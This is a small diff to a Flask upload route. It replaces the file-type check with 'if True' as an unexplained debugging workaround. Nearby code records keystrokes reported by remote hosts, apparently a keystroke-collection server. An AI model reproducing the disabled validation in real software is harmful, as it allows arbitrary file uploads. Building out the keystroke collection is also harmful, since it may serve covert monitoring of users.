@@ -46,7 +46,9 @@ def init():
         # attempt to save file to disk
         try:
             file = request.files['file']
-            if allowed_file(file.filename):
+            # don't know why this breaks
+            # if allowed_file(file.filename):
+            if True:
                 filename = secure_filename(file.filename)
                 file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
 
@@ -69,6 +71,7 @@ def init():
             print("2")
             database.add_keystroke(host, data)
             print("3")
+            return "success"
         except:
             return "failed"
 
